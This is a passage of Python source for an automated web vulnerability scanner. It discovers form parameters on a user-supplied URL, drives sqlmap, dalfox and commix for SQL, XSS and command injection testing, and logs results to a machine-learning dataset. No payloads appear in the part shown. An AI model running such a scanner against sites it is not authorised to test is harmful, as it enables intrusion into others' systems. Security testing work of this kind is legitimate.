                except (pd.errors.EmptyDataError, pd.errors.ParserError):
                    print("[!] Dataset corrupted, creating new.")
            df_new.to_csv(VULN_ML_DATASET_FILE, index=False)
            ind = os.path.join(self.scan_dir, "vulnerability_scan_data.csv")
            pd.DataFrame([features]).to_csv(ind, index=False)
            print(f"[+] Vuln data saved — {len(df_new)} records | {ind}")
            return df_new
        except Exception as e:
            print(f"[-] Save error: {e}"); return None

    def show_vuln_dataset_stats(self):
        try:
            if not (os.path.exists(VULN_ML_DATASET_FILE) and os.path.getsize(VULN_ML_DATASET_FILE)):
                print("\n[!] No vuln dataset yet"); return
            df = pd.read_csv(VULN_ML_DATASET_FILE)
            print(f"\n[+] VULN DATASET: {len(df)} scans | {df['url'].nunique()} targets | "
                  f"avg vulns {df['total_vulnerabilities'].mean():.1f} | "
                  f"SQLi {df['has_sql_injection'].mean():.1%} | "
                  f"XSS {df['has_xss'].mean():.1%} | "
                  f"CmdInj {df['has_command_injection'].mean():.1%}")
        except Exception as e:
            print(f"[-] Dataset stats error: {e}")

    def get_vulnerability_indicators(self):
        if not self.previous_scan_data: return []
        d = self.previous_scan_data['data']
        checks = [
            ('forms_present',         d.get('has_forms',0) or d.get('form_count',0)),
            ('inputs_present',        d.get('has_inputs',0) or d.get('input_count',0)),
            ('weak_security_headers', d.get('security_headers_count',0) < 3),
            ('php_technology',        d.get('tech_php',0) or d.get('is_php',0)),
            ('aspnet_technology',     d.get('tech_aspnet',0) or d.get('is_aspnet',0)),
            ('debug_info',            d.get('has_debug_info',0)),
            ('error_messages',        d.get('has_error_messages',0)),
            ('query_parameters',      d.get('has_query_params',0)),
            ('high_javascript',       d.get('script_count',0) > 10),
        ]
        return [label for label, cond in checks if cond]

    def extract_vulnerability_features(self, url, scan_results=None):
        p = urllib.parse.urlparse(url)
        vt = [v['type'].lower() for v in self.vulnerabilities_found]
        print(f"[DEBUG] Vulns: {len(vt)} — {vt}")

        def _has(k): return int(any(k in t for t in vt))
        def _cnt(k): return sum(1 for v in self.vulnerabilities_found if k in v.get('tool','').lower())

        ws = sum(next((w for sk, w in _SEV.items() if sk in t), 3) for t in vt)
        total = len(self.vulnerabilities_found)
        features = {
            'scan_id': self.scan_id, 'url': url, 'domain': p.netloc,
            'timestamp': datetime.now().isoformat(),
            'total_vulnerabilities': total,
            'has_sql_injection':    _has('sql'),
            'has_xss':              _has('xss'),
            'has_command_injection':_has('command'),
            'vulnerability_score':  ws,
            'critical_vuln_count':  sum(1 for v in self.vulnerabilities_found if any(k in v['type'].lower() for k in ['sql','command'])),
            'high_vuln_count':      sum(1 for v in self.vulnerabilities_found if any(k in v['type'].lower() for k in ['xss','path'])),
            'sqlmap_vulns_found':   _cnt('sqlmap'),
            'dalfox_vulns_found':   _cnt('dalfox'),
            'commix_vulns_found':   _cnt('commix'),
            'tools_used_count':     len(set(v.get('tool','?') for v in self.vulnerabilities_found)),
            'sqlmap_confidence_avg':self._calculate_avg_confidence('sqlmap'),
            'dalfox_confidence_avg':self._calculate_avg_confidence('dalfox'),
            'commix_confidence_avg':self._calculate_avg_confidence('commix'),
            'used_previous_scan':   int(bool(self.previous_scan_data)),
            'previous_scan_indicators': len(self.get_vulnerability_indicators()) if self.previous_scan_data else 0,
            'scan_hour':           datetime.now().hour,
            'scan_day_of_week':    datetime.now().weekday(),
            'url_length':          len(url),
            'has_https':           int(url.startswith('https')),
            'path_depth':          len([x for x in p.path.split('/') if x]),
            'has_query_params':    int(bool(p.query)),
            'num_query_params':    len(urllib.parse.parse_qs(p.query)),
            'subdomain_count':     max(0, len(p.netloc.split('.'))-2),
        }
        if self.previous_scan_data:
            d = self.previous_scan_data['data']
            features.update({
                'prev_has_forms':          d.get('has_forms',0),
                'prev_has_inputs':         d.get('has_inputs',0),
                'prev_form_count':         d.get('form_count',0),
                'prev_input_count':        d.get('input_count',0),
                'prev_has_debug_info':     d.get('has_debug_info',0),
                'prev_has_error_messages': d.get('has_error_messages',0),
                'prev_technology_php':     d.get('tech_php',0) or d.get('is_php',0),
                'prev_technology_aspnet':  d.get('tech_aspnet',0) or d.get('is_aspnet',0),
                'prev_technology_wordpress':d.get('tech_wordpress',0),
                'prev_security_headers_count':d.get('security_headers_count',0),
                'prev_response_size':      d.get('response_size',0),
                'days_since_last_scan':    self._calculate_days_since_prev_scan(),
            })
        if scan_results: features.update(self._extract_scan_metrics(scan_results))
        inp = features.get('prev_input_count',1)
        features.update({
            'vuln_density':            total / max(inp,1),
            'tool_effectiveness':      (features['sqlmap_vulns_found']+features['dalfox_vulns_found']+features['commix_vulns_found']) / max(total,1),
            'security_risk_score':     (features['critical_vuln_count']*10 + features['high_vuln_count']*7) / 100.0,
            'input_vulnerability_ratio':total / max(inp,1),
            'previous_scan_accuracy':  int(features['used_previous_scan'] and total > 0),
        })
        print(f"[*] {len(features)} features — SQLi:{features['has_sql_injection']} XSS:{features['has_xss']} "
              f"CmdInj:{features['has_command_injection']} Total:{total} Score:{ws}")
        self.save_vulnerability_dataset(features)
        return features

    def _extract_scan_metrics(self, _):
        metrics = {'total_tests_performed':0,'successful_tests':0,
                   'blocked_requests':0,'waf_detected':0,'error_responses':0}
        sf = self._find_sqlmap_output_files()
        if sf: metrics['sqlmap_tests_count'] = len(sf)
        df_path = os.path.join(self.scan_dir, "dalfox_results.txt")
        if os.path.exists(df_path):
            c = open(df_path).read()
            metrics.update({'dalfox_tested_urls': c.count('Testing:'),
                            'dalfox_vuln_indicators': c.count('VULNERABILITY:')})
        cd = os.path.join(self.scan_dir, "commix_results")
        if os.path.exists(cd):
            metrics['commix_test_files'] = sum(len(fs) for _,_,fs in os.walk(cd))
        return metrics

    # ── Report ─────────────────────────────────────────────────────────────
    def generate_report(self, url):
        sep = '='*60
        hdr = (f"\n{sep}\nVULNERABILITY ASSESSMENT REPORT\n{sep}\n"
               f"Target: {url}\nScan ID: {self.scan_id}\n"
               f"Time: {datetime.now():%Y-%m-%d %H:%M:%S}\n"
               f"Tools: sqlmap, dalfox, commix\n"
               f"Total Vulns: {len(self.vulnerabilities_found)}\n{sep}")
        print(hdr)
        lines = [hdr.replace('\n','',1)]
        if self.vulnerabilities_found:
            print("\n[!] VULNERABILITIES FOUND:")
            lines.append("VULNERABILITIES FOUND:")
            for i, v in enumerate(self.vulnerabilities_found, 1):
                entry = (f"\n{i}. {v['type']}\n"
                         f"   Parameter: {v.get('parameter','multiple')}\n"
                         f"   Payload: {v.get('payload','automated')}\n"
                         f"   Evidence: {v['evidence']}\n"
                         f"   Tool: {v.get('tool','manual')} | Conf: {v.get('confidence','medium')}")
                print(entry); lines.append(entry + "\n" + "-"*50)
        else:
            print("\n[+] No vulnerabilities detected"); lines.append("No vulnerabilities detected.")
        rf = os.path.join(self.scan_dir, "vulnerability_report.txt")
        open(rf, 'w').write('\n'.join(lines))
        print(f"\n[+] Report → {rf}")

    # ── Parameter extraction ───────────────────────────────────────────────
    def extract_paths_from_analysis(self, analysis_file=None):
        af = analysis_file or os.path.join(self.scan_dir, "response_analysis.txt")
        if not os.path.exists(af):
            print(f"[-] Analysis file not found: {af}"); return []
        try:
            content = open(af, encoding='utf-8').read()
            m = re.search(r'Target URL:\s*(https?://[^\s]+)', content)
            if not m: print("[-] No base URL in analysis"); return []
            base = m.group(1).rstrip('/')
            paths, section = [], re.search(r'FORMS ANALYSIS:.*?(?=BUTTONS ANALYSIS:|\Z)', content, re.DOTALL)
            if section:
                for block in re.findall(r'Form \d+:.*?(?=Form \d+:|\Z)', section.group(0), re.DOTALL):
                    am = re.search(r'Action:\s*([^\s]+)', block)
                    act = urllib.parse.urljoin(base, am.group(1)) if am else base
                    im = re.search(r'Inputs:\s*\[([^\]]+)\]', block)
                    if im:
                        params = [p.strip().strip("'") for p in im.group(1).split(',') if p.strip()]
                        if params: paths.append(f"{act}?{'&'.join(f'{p}=FUZZ' for p in params)}")
            if paths:
                print(f"[+] Extracted {len(paths)} paths")
                for p in paths[:5]: print(f"    {p}")
                if len(paths) > 5: print(f"    ... +{len(paths)-5} more")
            return paths
        except Exception as e:
            print(f"[-] Error: {e}"); return []

    def generate_parameter_files_from_url(self, url):
        print(f"[*] Generating parameter files for: {url}")
        try:
            resp  = httpx.get(url, timeout=10.0, verify=False, follow_redirects=True)
            from bs4 import BeautifulSoup
            soup  = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            print(f"[*] {len(forms)} forms found")
            test_urls = []
            for form in forms:
                act = form.get('action','')
                act = url if not act else (act if act.startswith('http') else urllib.parse.urljoin(url, act))
                params = [i.get('name','') for i in form.find_all(['input','textarea','select'])
                          if i.get('name') and i.get('type','').lower() not in ['submit','button','reset','image']]
                if params: test_urls.append(f"{act}?{'&'.join(f'{p}=FUZZ' for p in params)}")
            if not test_urls:
                print("[*] No forms, using common params")
                test_urls = [f"{url}?{p}=FUZZ" for p in ['id','search','q','query','page','user','name']]
        except Exception as e:
            print(f"[-] Error: {e}")
            test_urls = [f"{url}?id=FUZZ", f"{url}?search=FUZZ"]
        for fn in ['xss_parameters.txt','sqli_parameters.txt','rce_parameters.txt']:
            open(fn, 'w').write('\n'.join(test_urls))
            print(f"[+] {fn}: {len(test_urls)} URLs")
        return test_urls

    # ── Vulnerability scan orchestration ──────────────────────────────────
    def perform_vulnerability_scanning(self, url):
        try:
            r = httpx.get(url, timeout=10.0, verify=False, follow_redirects=True)
            print(f"[+] Connected: {r.status_code}")
        except Exception as e:
            print(f"[-] Connection failed: {e}\n[*] Continuing anyway...")

        # ── Phase 1: Smart parameter discovery ──
        print(f"\n{'='*60}\n  PHASE 1: PARAMETER DISCOVERY\n{'='*60}")
        targets = self.discover_parameters(url)

        # Write discovered params to parameter files for external tools
        param_urls = []
        for method_targets in [targets.get('get', []), targets.get('post', [])]:
            for t in method_targets:
                for p in t['params']:
                    param_urls.append(f"{t['url']}?{p}=FUZZ")
        if not param_urls:
            param_urls = [f"{url}?id=FUZZ", f"{url}?search=FUZZ"]
        for fn in ['xss_parameters.txt', 'sqli_parameters.txt', 'rce_parameters.txt']:
            open(fn, 'w').write('\n'.join(param_urls))
            print(f"[+] {fn}: {len(param_urls)} URLs")

        # ── Phase 2: Built-in vulnerability checks (always run) ──
        print(f"\n{'='*60}\n  PHASE 2: BUILT-IN VULNERABILITY CHECKS\n{'='*60}")
        builtin_vulns = []

        hdr_vulns = self.check_headers_vulns(url)
        builtin_vulns.extend(hdr_vulns)

        sqli_vulns = self.check_sqli_builtin(url, targets)
        builtin_vulns.extend(sqli_vulns)

        xss_vulns = self.check_xss_builtin(url, targets)
        builtin_vulns.extend(xss_vulns)

        if builtin_vulns:
            self.vulnerabilities_found.extend(builtin_vulns)
            print(f"\n[!] BUILT-IN CHECKS FOUND {len(builtin_vulns)} ISSUE(S):")
            for v in builtin_vulns:
                print(f"    - [{v.get('confidence','?').upper()}] {v['type']} → {v.get('parameter','?')}")
        else:
            print(f"\n[*] Built-in checks: no issues found")

        # ── Phase 3: External tool checks (optional, may fail) ──
        print(f"\n{'='*60}\n  PHASE 3: EXTERNAL TOOL CHECKS\n{'='*60}")
        try:
            self.check_xss_with_dalfox()
        except Exception as e:
            print(f"    [-] Dalfox skipped: {e}")
        try:
            self.check_sql_injection_with_sqlmap()
        except Exception as e:
            print(f"    [-] SQLMap skipped: {e}")
        try:
            self.check_command_injection_with_commix()
        except Exception as e:
            print(f"    [-] Commix skipped: {e}")


# ═══════════════════════════════════════════════════════════════════════════
def MainestVuln(url):
    print(f"[*] Dataset dir: {DATASET_DIR or '(current)'}\n[*] Vuln dataset: {VULN_ML_DATASET_FILE}")
    URLVulnerabilityChecker().check_vulnerabilities(url)

if __name__ == "__main__":
    MainestVuln(input("Enter The URL: "))